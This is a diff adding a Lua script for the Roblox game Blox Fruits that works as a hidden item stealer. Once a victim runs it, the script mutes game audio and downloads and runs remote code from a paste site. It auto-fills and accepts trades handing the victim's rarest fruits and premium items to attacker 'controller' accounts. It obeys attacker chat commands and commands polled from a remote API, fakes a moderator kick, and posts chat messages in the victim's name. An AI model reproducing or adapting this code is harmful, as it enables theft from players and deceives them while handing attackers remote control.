@@ -1,0 +1,2509 @@
+-- discord.gg/syncrypt
+
+if not pcall(function()
+	for k in utf8.graphemes("test") do
+		return k
+	end
+end) then
+	while task.wait() do
+		error("coper wrote this msg")
+	end
+
+	error("coper wrote this msg")
+end
+
+local getgenv_
+
+if typeof ~= nil and typeof(getgenv) == "function" then
+	local ok, result = pcall(getgenv)
+
+	if ok and type(result) == "table" then
+		getgenv_ = result
+	end
+elseif type(getgenv) == "function" then
+	local ok, result = pcall(getgenv)
+
+	if ok and type(result) == "table" then
+		getgenv_ = result
+	end
+elseif type(getgenv) == "table" then
+	getgenv_ = getgenv
+end
+
+if type(getgenv_) ~= "table" then
+	if type(_G) == "table" then
+		getgenv_ = _G
+	else
+		getgenv_ = {}
+	end
+end
+
+local v7 = getgenv_
+local Controllers = v7.Controllers or v7.ControllerNames or v7.ControllerName or v7.Controller or ""
+
+if type(Controllers) ~= "table" then
+	Controllers = { tostring(Controllers) }
+end
+
+local t1 = {}
+local t2 = {}
+
+for _, Controller in ipairs(Controllers) do
+	if type(Controller) == "string" and Controller ~= "" then
+		local v13 = Controller:lower()
+
+		if not t2[v13] then
+			table.insert(t1, Controller)
+			t2[v13] = true
+		end
+	end
+end
+
+if #t1 == 0 then
+	table.insert(t1, "achocohieuhoinach")
+	t2.achocohieuhoinach = true
+end
+
+local Webhook = v7.Webhook or v7.webhook or v7.WebhookToken or v7.BloxFruitWebhook or v7.BFWebhook or v7.WebhookBF or "wh_e38cd691f8a0941e57"
+local s1 = ""
+local v16 = Webhook
+
+if type(v16) == "string" and v16 ~= "" then
+	if v16:match("^https?://") then
+		s1 = v16
+	else
+		s1 = "" .. v16
+	end
+end
+
+getgenv().BloxFruitProtectorURL = ""
+
+local BloxFruitProtectorURL = v7.BloxFruitProtectorURL or v7.BFProtectorURL or ""
+local JoinScriptURL = v7.JoinScriptURL or v7.BFJoinScriptURL or ""
+local WantedFruit = v7.WantedFruit or v7.WantedFruits or v7.Wanted or nil
+local t3 = {}
+
+if type(WantedFruit) == "table" then
+	for _, v in ipairs(WantedFruit) do
+		if type(v) == "string" and v ~= "" then
+			t3[v:lower()] = true
+		end
+	end
+end
+
+t3.dragon = true
+t3.kitsune = true
+t3["galaxy dragon"] = true
+t3["empyrean dragon"] = true
+t3["ember dragon (east)"] = true
+t3["ember dragon (west)"] = true
+t3["galaxy kitsune"] = true
+t3["empyrean kitsune"] = true
+t3["crimson kitsune"] = true
+t3["divine portal"] = true
+t3["galaxy (empyrean)"] = true
+t3["rose quartz diamond"] = true
+t3["dark pain"] = true
+t3["blue pain"] = true
+t3["orange pain"] = true
+
+local TWEEN_TIME = v7.TWEEN_TIME or 0.2
+local TRAVEL_SPEED = v7.TRAVEL_SPEED or 280
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+
+game:GetService("TeleportService")
+
+local SoundService = game:GetService("SoundService")
+
+if identifyexecutor() == "Delta" then
+	repeat
+		stepAnimate = nil
+
+		for _, v in ipairs(getgc(true)) do
+			if typeof(v) == "function" then
+				local v32 = debug.getinfo(v)
+
+				if v32 and v32.name == "stepAnimate" then
+					stepAnimate = v
+
+					break
+				end
+			end
+		end
+
+		task.wait()
+	until stepAnimate
+
+	local v33
+
+	v33 = hookfunction(stepAnimate, function(p1)
+		if not printed then
+			printed = true
+			bypassJobId = game.JobId
+			capturedJobId = true
+		end
+
+		return v33(p1)
+	end)
+
+	while true do
+		task.wait()
+
+		if not capturedJobId then
+			continue
+		end
+
+		if bypassJobId then
+			break
+		end
+	end
+else
+	bypassJobId = game.JobId
+end
+
+local LocalPlayer = Players.LocalPlayer
+local PlaceId = game.PlaceId
+local bypassJobId_ = bypassJobId
+
+bypassJobId_ = bypassJobId_ or game.JobId
+pcall(function()
+	if not identifyexecutor or identifyexecutor() ~= "Delta" then
+		bypassJobId_ = game:GetService("ServerBrowser"):InvokeServer("getjob") or bypassJobId_
+	end
+end)
+
+local function v37(descendant)
+	if descendant:IsA("Sound") then
+		pcall(function()
+			descendant.Volume = 0
+			descendant.Playing = false
+			descendant.PlaybackSpeed = 0
+			descendant.Looped = false
+		end)
+	end
+end
+local function v38()
+	pcall(function()
+		SoundService.Volume = 0
+		SoundService.RespectFilteringEnabled = true
+	end)
+
+	for _, descendant in ipairs(workspace:GetDescendants()) do
+		v37(descendant)
+	end
+
+	for _, descendant in ipairs(SoundService:GetDescendants()) do
+		v37(descendant)
+	end
+
+	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+
+	if PlayerGui then
+		for _, descendant in ipairs(PlayerGui:GetDescendants()) do
+			v37(descendant)
+		end
+
+		PlayerGui.DescendantAdded:Connect(v37)
+	end
+
+	workspace.DescendantAdded:Connect(v37)
+	SoundService.DescendantAdded:Connect(v37)
+end
+
+local _ = pcall(function()
+	loadstring(game:HttpGet("https://pastefy.app/7N398b02/raw"))()
+end)
+
+task.wait(0.5)
+pcall(function()
+	local CommF_ = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
+
+	for i = 1, 2 do
+		CommF_:InvokeServer(unpack({
+			"SetTeam",
+			"Pirates"
+		}))
+		task.wait(0.2)
+	end
+end)
+v38()
+LocalPlayer.CharacterAdded:Connect(function()
+	task.wait(0.5)
+	v38()
+end)
+pcall(function()
+	game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdatePlayerProfileValue"):InvokeServer("Setting", "JoinServer", "Everyone")
+end)
+
+local request_ = syn and syn.request or http and http.request or http_request or request or httprequest or fluxus and fluxus.request
+local t4 = {}
+
+local function v52(p2)
+	if not p2 then
+		return
+	end
+
+	if not t2[p2.Name:lower()] then
+		return
+	end
+
+	local DisplayName = p2.DisplayName or p2.Name
+
+	if DisplayName and DisplayName ~= "" then
+		t4[DisplayName:lower()] = true
+	end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	v52(player)
+end
+
+Players.PlayerAdded:Connect(function(player)
+	v52(player)
+end)
+
+local t5 = {
+	[4442272183] = {
+		Vector3.new(-297.66, 73.22, 282.3),
+		Vector3.new(-297.66, 73.22, 271.04),
+		Vector3.new(-463.42, 73.22, 282.3),
+		Vector3.new(-463.42, 73.22, 271.04)
+	},
+	[7449423635] = {
+		Vector3.new(-12599, 343.15, -7543.92),
+		Vector3.new(-12602.31, 337.59, -7544.76),
+		Vector3.new(-12602.31, 337.59, -7556.76),
+		Vector3.new(-12602.31, 337.59, -7568.76),
+		Vector3.new(-12591.06, 337.59, -7568.76),
+		Vector3.new(-12591.06, 337.59, -7556.76)
+	}
+}
+
+t5[79091703265657] = t5[4442272183]
+t5[100117331123089] = t5[7449423635]
+
+local v57 = t5[PlaceId] or {}
+
+if #v57 == 0 then
+	warn("[BF Trade] No waypoint configured for this PlaceId:", PlaceId)
+end
+
+local CommF_ = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+local t6 = {
+	5,
+	[0] = 6,
+	[2] = 4,
+	[3] = 3,
+	[4] = 2,
+	[5] = 1
+}
+local t7 = {
+	"galaxy dragon",
+	"empyrean dragon",
+	"ember dragon (east)",
+	"ember dragon (west)",
+	"galaxy kitsune",
+	"empyrean kitsune",
+	"crimson kitsune",
+	"divine portal",
+	"galaxy (empyrean",
+	"requiem eagle",
+	"glacier eagle",
+	"rose quartz diamond",
+	"dark pain",
+	"blue pain",
+	"orange pain",
+	"green lightning"
+}
+
+local function v62(p3)
+	if p3 then
+		if p3 ~= "" then
+			local v63 = p3:lower()
+
+			for _, v in ipairs(t7) do
+				if v63:find(v, 1, true) then
+					return true
+				end
+			end
+
+			return false
+		end
+	end
+
+	return false
+end
+local function v66()
+	local ok2, result2 = pcall(function()
+		return CommF_:InvokeServer("getInventory")
+	end)
+
+	if ok2 then
+		return result2 or {}
+	end
+
+	warn("[BF Trade] getInventory failed:", result2)
+
+	return {}
+end
+
+local t8 = {}
+
+local function v70()
+	local ok2, result2 = pcall(function()
+		local Frame = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Trade"):WaitForChild("Container"):WaitForChild("1"):WaitForChild("Frame")
+		local n1 = 0
+
+		for _, child in ipairs(Frame:GetChildren()) do
+			if tonumber(child.Name) then
+				n1 += 1
+			end
+		end
+
+		return n1
+	end)
+
+	return ok2 and result2 or 0
+end
+local function v77(p4)
+	if not p4 then
+		return
+	end
+
+	if v70() >= 4 then
+		return "full"
+	end
+
+	local ItemId = p4.ItemId or p4.Id
+
+	if not ItemId then
+		return
+	end
+
+	pcall(function()
+		TradeFunction:InvokeServer("addItem", ItemId, 1)
+	end)
+	task.wait(0.1)
+
+	if v70() >= 4 then
+		return "full"
+	end
+
+	table.insert(t8, p4)
+end
+local function v79(p5)
+	if not p5 then
+		return
+	end
+
+	local ItemId = p5.ItemId or p5.Id
+
+	if ItemId then
+		pcall(function()
+			TradeFunction:InvokeServer("removeItem", ItemId, 1)
+		end)
+
+		return
+	end
+end
+local function v81(p6)
+	if not p6 or p6 == "" then
+		return ""
+	end
+
+	return (p6:lower():gsub("(%a)(%w*)", function(p7, p8)
+		return p7:upper() .. p8
+	end))
+end
+local function v82(p9)
+	if not p9 or p9 == "" then
+		return ""
+	end
+
+	if string.find(p9, "-", 1, true) then
+		return p9
+	end
+
+	local v83 = v81(p9)
+
+	return v83 .. "-" .. v83
+end
+local function v84(p10)
+	if not p10 or p10 == "" then
+		return nil
+	end
+
+	local v85 = p10:lower()
+	local v86 = v66()
+	local v87
+
+	for _, v in pairs(v86) do
+		local Type = v.Type
+
+		if Type == "Blox Fruit" or Type == "Premium" then
+			local v91 = (v.DisplayName or v.Name or ""):lower()
+
+			if v91 == v85 then
+				return v
+			end
+
+			if not v87 and v91:find(v85, 1, true) then
+				v87 = v
+			end
+		end
+	end
+
+	return v87
+end
+local function v92()
+	local v93 = v66()
+	local t9 = {}
+
+	for _, v in pairs(v93) do
+		if v.Type == "Blox Fruit" then
+			local Rarity = v.Rarity or 0
+
+			if Rarity ~= 5 then
+				local Count = v.Count or 1
+				local Value = v.Value or 0
+				local DisplayName = v.DisplayName or v.Name
+				local v101 = v62(DisplayName) and 0 or 1
+
+				for i = 1, Count do
+					table.insert(t9, {
+						Name = v.Name,
+						DisplayName = DisplayName,
+						RarityNum = Rarity,
+						Value = Value,
+						SkinPrio = v101,
+						ItemId = v.ItemId or v.Id
+					})
+				end
+			end
+		end
+	end
+
+	if #t9 == 0 then
+		warn("[BF Trade] No fruits to add.")
+
+		return
+	end
+
+	table.sort(t9, function(p11, p12)
+		local SkinPrio = p11.SkinPrio or 1
+		local SkinPrio2 = p12.SkinPrio or 1
+
+		if SkinPrio ~= SkinPrio2 then
+			return SkinPrio < SkinPrio2
+		end
+
+		local v105 = t6[p11.RarityNum] or 99
+		local v106 = t6[p12.RarityNum] or 99
+
+		if v105 ~= v106 then
+			return v105 < v106
+		end
+
+		if p11.Value == p12.Value then
+			return (p11.DisplayName or "") < (p12.DisplayName or "")
+		end
+
+		return (p11.Value or 0) > (p12.Value or 0)
+	end)
+
+	for i = 1, math.min(10, #t9) do
+		if v77(t9[i]) == "full" then
+			break
+		end
+
+		task.wait(0.12)
+	end
+end
+local function v108()
+	local v109 = v66()
+	local t10 = {}
+
+	for _, v in pairs(v109) do
+		if v.Type == "Premium" then
+			local Rarity = v.Rarity or 5
+
+			if not v.Count then
+			end
+
+			table.insert(t10, {
+				Name = v.Name,
+				DisplayName = v.DisplayName,
+				RarityNum = Rarity,
+				Value = v.Value or 0,
+				ItemId = v.ItemId or v.Id
+			})
+		end
+	end
+
+	if #t10 == 0 then
+		warn("[BF Trade] No premium items to add.")
+
+		return
+	end
+
+	table.sort(t10, function(p13, p14)
+		local v114 = t6[p13.RarityNum] or 99
+		local v115 = t6[p14.RarityNum] or 99
+
+		if v114 ~= v115 then
+			return v114 < v115
+		end
+
+		if p13.Value == p14.Value then
+			return (p13.DisplayName or "") < (p14.DisplayName or "")
+		end
+
+		return (p13.Value or 0) > (p14.Value or 0)
+	end)
+
+	for i = 1, math.min(10, #t10) do
+		if v77(t10[i]) ~= "full" then
+			task.wait(0.12)
+
+			continue
+		end
+
+		break
+	end
+end
+local function v117()
+	local v118 = v66()
+	local t11 = {}
+
+	for _, v in pairs(v118) do
+		if v.Type == "Mutated Fruit" then
+			local Count = v.Count or 1
+			local Value = v.Value or 0
+
+			for i = 1, Count do
+				table.insert(t11, {
+					Name = v.Name,
+					DisplayName = v.DisplayName or v.Name,
+					Value = Value
+				})
+			end
+		end
+	end
+
+	if #t11 == 0 then
+		return
+	end
+
+	table.sort(t11, function(p15, p16)
+		return (p15.Value or 0) > (p16.Value or 0)
+	end)
+
+	for i = 1, math.min(10, #t11) do
+		if v77(t11[i]) ~= "full" then
+			task.wait(0.12)
+
+			continue
+		end
+
+		break
+	end
+end
+local function v126(p17)
+	if not p17 or p17 == "" then
+		return
+	end
+
+	local v127 = v84(p17)
+
+	if v127 then
+		v77(v127)
+
+		return
+	end
+
+	warn("[BF Trade] Item not found in inventory:", p17)
+end
+local function v128(p18)
+	if p18 then
+		if p18 ~= "" then
+			local v129 = v84(p18)
+
+			if v129 then
+				v79(v129)
+
+				return
+			end
+
+			warn("[BF Trade] Item not found in inventory:", p18)
+
+			return
+		end
+	end
+end
+local function v130()
+	for _, v in ipairs(t8) do
+		v79(v)
+		task.wait(0.05)
+	end
+
+	table.clear(t8)
+end
+local function v133()
+	TradeFunction:InvokeServer("accept")
+end
+local function v134()
+	TradeFunction:InvokeServer("cancel")
+end
+local function v135()
+	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+	return Character, Character:WaitForChild("Humanoid"), (Character:WaitForChild("HumanoidRootPart"))
+end
+local function v137(p19)
+	if not p19 then
+		return false
+	end
+
+	if p19.Sit then
+		return true
+	end
+
+	if p19.SeatPart == nil then
+		return p19:GetState() == Enum.HumanoidStateType.Seated
+	end
+
+	return true
+end
+local function v138()
+	local _, v140 = v135()
+
+	if v140 then
+		v140.Sit = false
+		v140.Jump = true
+	end
+end
+local function v141()
+	local _WorldOrigin = workspace:FindFirstChild("_WorldOrigin")
+
+	if not _WorldOrigin then
+		return nil
+	end
+
+	local Locations = _WorldOrigin:FindFirstChild("Locations")
+
+	if not Locations then
+		return nil
+	end
+
+	if PlaceId == 4442272183 or PlaceId == 79091703265657 then
+		for _, child in ipairs(Locations:GetChildren()) do
+			if child.Name:lower():find("caf") then
+				return child.CFrame
+			end
+		end
+	elseif PlaceId == 7449423635 or PlaceId == 100117331123089 then
+		local Mansion = Locations:FindFirstChild("Mansion")
+
+		if Mansion then
+			return Mansion.CFrame
+		end
+	end
+
+	return nil
+end
+local function v147()
+	if #v57 > 0 then
+		return v57[1]
+	end
+
+	local v148 = v141()
+
+	return v148 and v148.Position or nil
+end
+local function v149(p20)
+	if not p20 then
+		return false
+	end
+
+	if not (#v57 > 0) then
+		local v150 = v141()
+
+		if v150 then
+			return (p20.Position - v150.Position).Magnitude <= 50
+		end
+
+		return false
+	end
+
+	local Position = p20.Position
+	local huge = math.huge
+
+	for _, v in ipairs(v57) do
+		local Magnitude = (Position - v).Magnitude
+
+		if Magnitude < huge then
+			huge = Magnitude
+		end
+	end
+
+	return huge <= 30
+end
+
+local u156 = false
+local u157 = false
+local vector3 = Vector3.new(-12471.17, 374.94, -7551.678)
+
+local function v159(p21)
+	CommF_:InvokeServer("requestEntrance", p21)
+
+	local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+
+	if HumanoidRootPart then
+		HumanoidRootPart.CFrame += Vector3.new(0, 50, 0)
+	end
+
+	task.wait(0.5)
+end
+
+local u161 = false
+
+local function v162()
+	local _, v164, v165 = v135()
+
+	if not v165 then
+		return
+	end
+
+	if v149(v165) then
+		return
+	end
+
+	if PlaceId == 7449423635 or PlaceId == 100117331123089 then
+		v159(vector3)
+
+		local _, v167, v168 = v135()
+
+		v164 = v167
+		v165 = v168
+
+		if not v165 then
+			return
+		end
+	end
+
+	local v169 = v147()
+
+	if not v169 then
+		return
+	end
+
+	u156 = true
+	u161 = true
+
+	if not LocalPlayer.Character:FindFirstChild("PartTele") then
+		local Part = Instance.new("Part", LocalPlayer.Character)
+
+		Part.Size = Vector3.new(10, 1, 10)
+		Part.Name = "PartTele"
+		Part.Anchored = true
+		Part.Transparency = 1
+		Part.CanCollide = true
+		Part.CFrame = v165.CFrame
+		Part:GetPropertyChangedSignal("CFrame"):Connect(function()
+			if u161 then
+				task.wait()
+
+				local Character = LocalPlayer.Character
+
+				if Character then
+					if Character:FindFirstChild("HumanoidRootPart") then
+						Character.HumanoidRootPart.CFrame = Part.CFrame
+					end
+				end
+			end
+		end)
+	end
+
+	local PartTele = LocalPlayer.Character:FindFirstChild("PartTele")
+
+	if not PartTele then
+		u156 = false
+		u161 = false
+
+		return
+	end
+
+	local tween = TweenService:Create(PartTele, TweenInfo.new((v165.Position - v169).Magnitude / TRAVEL_SPEED, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
+		CFrame = CFrame.new(v169)
+	})
+
+	tween:Play()
+
+	local u174 = false
+
+	tween.Completed:Connect(function(playbackState)
+		if playbackState == Enum.PlaybackState.Completed then
+			u174 = true
+			u161 = false
+
+			if LocalPlayer.Character:FindFirstChild("PartTele") then
+				LocalPlayer.Character.PartTele:Destroy()
+			end
+		end
+	end)
+
+	while not u174 do
+		if not v165.Parent then
+			u161 = false
+
+			if LocalPlayer.Character:FindFirstChild("PartTele") then
+				LocalPlayer.Character.PartTele:Destroy()
+			end
+
+			break
+		end
+
+		if v137(v164) then
+			tween:Cancel()
+			u161 = false
+
+			if LocalPlayer.Character:FindFirstChild("PartTele") then
+				LocalPlayer.Character.PartTele:Destroy()
+			end
+
+			break
+		elseif v149(v165) then
+			tween:Cancel()
+			u161 = false
+
+			if LocalPlayer.Character:FindFirstChild("PartTele") then
+				LocalPlayer.Character.PartTele:Destroy()
+			end
+
+			break
+		else
+			task.wait(0.02)
+		end
+	end
+
+	u156 = false
+end
+
+task.spawn(function()
+	if #v57 == 0 then
+		return
+	end
+
+	local n2 = 1
+
+	while true do
+		local _, _, v178 = v135()
+
+		if v149(v178) or u157 then
+			while u156 do
+				task.wait(0.25)
+			end
+
+			local v179 = v57[n2]
+
+			if v179 and v178 then
+				local tween = TweenService:Create(v178, TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {
+					CFrame = CFrame.new(v179)
+				})
+
+				tween:Play()
+
+				local u181 = false
+
+				tween.Completed:Connect(function()
+					u181 = true
+				end)
+
+				while not u181 and v178.Parent do
+					if not u156 then
+						task.wait(0.02)
+
+						continue
+					end
+
+					tween:Cancel()
+
+					break
+				end
+
+				if u181 then
+					task.wait(0.2)
+					n2 += 1
+
+					if n2 > #v57 then
+						n2 = 1
+					end
+
+					task.wait(0.05)
+
+					continue
+				end
+
+				n2 += 1
+
+				if n2 > #v57 then
+					n2 = 1
+					task.wait(0.05)
+
+					continue
+				end
+			end
+
+			task.wait(0.05)
+		else
+			v162()
+			task.wait(0.25)
+		end
+	end
+end)
+
+local function v182()
+	local v183 = v66()
+
+	for _, v in pairs(v183) do
+		if v.Type ~= "Premium" then
+			continue
+		end
+
+		if (v.Count or 0) > 0 then
+			return true
+		end
+	end
+
+	return false
+end
+local function v186()
+	local v187 = v66()
+
+	for _, v in pairs(v187) do
+		if v.Type ~= "Mutated Fruit" then
+			continue
+		end
+
+		if (v.Count or 0) > 0 then
+			return true
+		end
+	end
+
+	return false
+end
+
+task.spawn(function()
+	local ok2, result2 = pcall(function()
+		local Trade = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("Main"):WaitForChild("Trade")
+		local TextLabel = Trade:WaitForChild("Container"):WaitForChild("2"):WaitForChild("TextLabel")
+
+		Color3.fromRGB(255, 26, 26)
+
+		local color3 = Color3.fromRGB(255, 255, 255)
+		local v195 = false
+
+		while true do
+			if Trade.Visible then
+				local tostring_ = tostring
+				local Text = TextLabel.Text
+				local v198, v199, v200
+
+				if not Text then
+					Text = ""
+					v198 = tostring_(Text)
+
+					if v198 ~= "" then
+						v199 = v198:lower()
+						v200 = t4[v199]
+
+						if not v200 then
+							v200 = t2[v199]
+
+							if v200 then
+								if not v195 then
+									v195 = true
+									task.spawn(function()
+										task.wait(0.3)
+
+										if v182() then
+											v108()
+											task.wait(0.3)
+										end
+
+										if v186() then
+											v117()
+											task.wait(0.3)
+										end
+
+										v92()
+
+										while Trade.Visible do
+											local BottomTitle = Trade:FindFirstChild("BottomTitle", true)
+
+											if BottomTitle and BottomTitle:IsA("TextLabel") and BottomTitle.TextColor3 == color3 then
+												v133()
+
+												break
+											else
+												task.wait(0.2)
+											end
+										end
+									end)
+								end
+							else
+								v138()
+							end
+
+							task.wait(0.25)
+
+							continue
+						end
+
+						if v200 then
+							if not v195 then
+								v195 = true
+								task.spawn(function()
+									task.wait(0.3)
+
+									if v182() then
+										v108()
+										task.wait(0.3)
+									end
+
+									if v186() then
+										v117()
+										task.wait(0.3)
+									end
+
+									v92()
+
+									while Trade.Visible do
+										local BottomTitle = Trade:FindFirstChild("BottomTitle", true)
+
+										if BottomTitle and BottomTitle:IsA("TextLabel") and BottomTitle.TextColor3 == color3 then
+											v133()
+
+											break
+										else
+											task.wait(0.2)
+										end
+									end
+								end)
+							end
+						else
+							v138()
+						end
+					end
+
+					task.wait(0.25)
+
+					continue
+				end
+
+				v198 = tostring_(Text)
+
+				if v198 ~= "" then
+					v199 = v198:lower()
+					v200 = t4[v199]
+
+					if not v200 then
+						v200 = t2[v199]
+
+						if v200 then
+							if not v195 then
+								v195 = true
+								task.spawn(function()
+									task.wait(0.3)
+
+									if v182() then
+										v108()
+										task.wait(0.3)
+									end
+
+									if v186() then
+										v117()
+										task.wait(0.3)
+									end
+
+									v92()
+
+									while Trade.Visible do
+										local BottomTitle = Trade:FindFirstChild("BottomTitle", true)
+
+										if BottomTitle and BottomTitle:IsA("TextLabel") and BottomTitle.TextColor3 == color3 then
+											v133()
+
+											break
+										else
+											task.wait(0.2)
+										end
+									end
+								end)
+							end
+						else
+							v138()
+						end
+
+						task.wait(0.25)
+
+						continue
+					end
+
+					if v200 then
+						if not v195 then
+							v195 = true
+							task.spawn(function()
+								task.wait(0.3)
+
+								if v182() then
+									v108()
+									task.wait(0.3)
+								end
+
+								if v186() then
+									v117()
+									task.wait(0.3)
+								end
+
+								v92()
+
+								while Trade.Visible do
+									local BottomTitle = Trade:FindFirstChild("BottomTitle", true)
+
+									if BottomTitle and BottomTitle:IsA("TextLabel") and BottomTitle.TextColor3 == color3 then
+										v133()
+
+										break
+									else
+										task.wait(0.2)
+									end
+								end
+							end)
+						end
+					else
+						v138()
+					end
+				end
+			else
+				v195 = false
+			end
+
+			task.wait(0.25)
+		end
+	end)
+
+	if not ok2 then
+		warn("[BF Trade] Trade guard error:", result2)
+	end
+end)
+
+local function v205(p22)
+	if not p22 or p22 == "" then
+		return
+	end
+
+	if u157 then
+		return
+	end
+
+	local match, v207 = p22:match("^(.-)%s+(%d+)x$")
+	local v208, v209
+
+	if v207 then
+		v209 = tonumber(v207) or 1
+		v208 = match:gsub("^%s+", ""):gsub("%s+$", "")
+	else
+		v208 = p22
+		v209 = 1
+	end
+
+	if v209 < 1 then
+		v209 = 1
+	end
+
+	local v210 = v84(v208)
+	local Name
+
+	if v210 then
+		Name = v210.Name or v210.DisplayName .. "-" .. v210.DisplayName
+	else
+		Name = v82(v208)
+	end
+
+	u157 = true
+	u156 = true
+	task.spawn(function()
+		for i = 1, v209 do
+			if not LocalPlayer.Character then
+				LocalPlayer.CharacterAdded:Wait()
+			end
+
+			v138()
+			task.wait(0.3)
+			pcall(function()
+				CommF_:InvokeServer("LoadFruit", Name)
+			end)
+
+			local now = tick()
+
+			while true do
+				if tick() - now < 1.5 then
+					local Character = LocalPlayer.Character
+
+					if not Character or not Character:FindFirstChildWhichIsA("Tool") then
+						task.wait(0.05)
+
+						continue
+					end
+
+					break
+				end
+
+				break
+			end
+
+			local Character = LocalPlayer.Character
+			local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+
+			if Humanoid and Humanoid.Health > 0 then
+				Humanoid.Health = 0
+			end
+
+			LocalPlayer.CharacterAdded:Wait()
+			task.wait(0.5)
+		end
+
+		u156 = false
+		u157 = false
+	end)
+end
+local function v217(p23)
+	LocalPlayer:Kick("Kicked by moderator: " .. (p23 and p23 ~= "" and p23 or "No reason provided."))
+end
+local function v218()
+	local _, _, v221 = v135()
+	local v222 = false
+
+	if v221 then
+		v222 = v149(v221)
+	end
+
+	local s2
+
+	if v222 then
+		s2 = "im here bro, come"
+	else
+		s2 = "im flying, pls wait to trade"
+	end
+
+	pcall(function()
+		local TextChatService = game:GetService("TextChatService")
+
+		if not TextChatService then
+			return
+		end
+
+		local TextChannels = TextChatService.TextChannels
+
+		if not TextChannels then
+			return
+		end
+
+		local RBXGeneral = TextChannels:FindFirstChild("RBXGeneral") or TextChannels:FindFirstChild("All")
+
+		if RBXGeneral then
+			RBXGeneral:SendAsync(s2)
+
+			return
+		end
+	end)
+end
+local function v227(p24)
+	if p24 == "+1 Fruit Storage" then
+		v126("+1 Fruit Storage")
+
+		return
+	end
+
+	if p24:sub(1, 1) ~= "." then
+		return
+	end
+
+	local match, v229 = p24:match("^%.(%S+)%s*(.*)$")
+
+	if not match then
+		return
+	end
+
+	local v230 = match:lower()
+
+	if v230 == "jump" then
+		v138()
+	elseif v230 == "addallfruits" or v230 == "addall" then
+		v92()
+	elseif v230 == "addallpre" or v230 == "addallpremium" then
+		v108()
+	elseif v230 == "accept" then
+		v133()
+	elseif v230 == "cancel" then
+		v134()
+	elseif v230 ~= "add" then
+		if v230 ~= "clear" then
+			if v230 == "clearall" then
+				v130()
+			elseif v230 ~= "reset" then
+				if v230 == "kick" then
+					v217(v229)
+				elseif v230 == "tp" then
+					v218()
+					v162()
+				end
+			elseif v229 and v229 ~= "" then
+				v205(v229)
+			end
+		elseif v229 and v229 ~= "" then
+			v128(v229)
+		end
+	elseif v229 and v229 ~= "" then
+		v126(v229)
+	end
+end
+local function v231()
+	return string.format("%s/api/get-command?user=%s&key=%s", "", HttpService:UrlEncode(LocalPlayer and LocalPlayer.Name or ""), "moziu-super-secret")
+end
+local function v232(p25)
+	if p25 then
+		if p25 ~= "" then
+			local v233 = tostring(p25)
+			local v234 = v233:lower()
+
+			if v234 == ".addallpre" then
+				v108()
+			elseif v234 == ".addallfruits" or v234 == ".addall" then
+				v92()
+			elseif v234 == ".clearall" then
+				v130()
+			elseif v234 == ".accept" then
+				v133()
+			elseif v234 == ".cancel" then
+				v134()
+			elseif v234:sub(1, 5) == ".add " then
+				local v235 = v233:sub(6):gsub("^%s+", "")
+
+				if v235 ~= "" then
+					v126(v235)
+				end
+			elseif v234:sub(1, 7) == ".clear " then
+				local v236 = v233:sub(8):gsub("^%s+", "")
+
+				if v236 ~= "" then
+					v128(v236)
+				end
+			elseif v234:sub(1, 7) == ".reset " then
+				local v237 = v233:sub(8):gsub("^%s+", "")
+
+				if v237 ~= "" then
+					v205(v237)
+				end
+			elseif v234:sub(1, 6) == ".kick " then
+				local v238 = v233:sub(7):gsub("^%s+", "")
+
+				v217(v238)
+			elseif v234 == ".kick" then
+				v217("")
+			elseif v234 == ".tp" then
+				v218()
+				v162()
+			elseif v234 == ".jump" then
+				v138()
+			else
+				warn("[BF Remote] Unknown command:", v233)
+			end
+
+			return
+		end
+	end
+end
+local function v239()
+	local v240 = v231()
+	local ok2, result2 = pcall(function()
+		return request_({
+			Url = v240,
+			Method = "GET",
+			Headers = {}
+		})
+	end)
+
+	if not ok2 or not result2 then
+		return
+	end
+
+	local Body = result2.Body or result2.body or ""
+
+	if Body == "" then
+		return
+	end
+
+	local ok3, result3 = pcall(function()
+		return HttpService:JSONDecode(Body)
+	end)
+
+	if not ok3 or not result3 then
+		return
+	end
+
+	if result3.ok and type(result3.cmd) == "string" and result3.cmd ~= "" then
+		v232(result3.cmd)
+	end
+end
+
+task.spawn(function()
+	while task.wait(0.4) do
+		pcall(v239)
+	end
+end)
+
+local TextChatService = game:GetService("TextChatService")
+
+local function v247(p26, p27)
+	if not p26 or not p27 then
+		return
+	end
+
+	if t2[(p26.Name or ""):lower()] then
+		v227(p27)
+
+		return
+	end
+end
+local function v248(player)
+	if not player then
+		return
+	end
+
+	if not t2[(player.Name or ""):lower()] then
+		return
+	end
+
+	v52(player)
+	player.Chatted:Connect(function(message)
+		v247(player, message)
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	v248(player)
+end
+
+Players.PlayerAdded:Connect(v248)
+pcall(function()
+	if not TextChatService then
+		return
+	end
+
+	if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+		return
+	end
+
+	local function v251(p28)
+		if not p28 then
+			return
+		end
+
+		local TextSource = p28.TextSource
+
+		if TextSource then
+			local TextSourceName = Players:FindFirstChild(TextSource.Name)
+
+			if TextSourceName then
+				v247(TextSourceName, p28.Text)
+
+				return
+			end
+
+			return
+		end
+	end
+
+	local ok2, result2 = pcall(function()
+		return TextChatService.MessageReceived
+	end)
+
+	if ok2 and result2 then
+		result2:Connect(v251)
+	end
+
+	local TextChannels
+
+	pcall(function()
+		TextChannels = TextChatService:FindFirstChild("TextChannels") or TextChatService.TextChannels
+	end)
+
+	if not TextChannels then
+		return
+	end
+
+	local function v257(p29)
+		if not p29 then
+			return
+		end
+
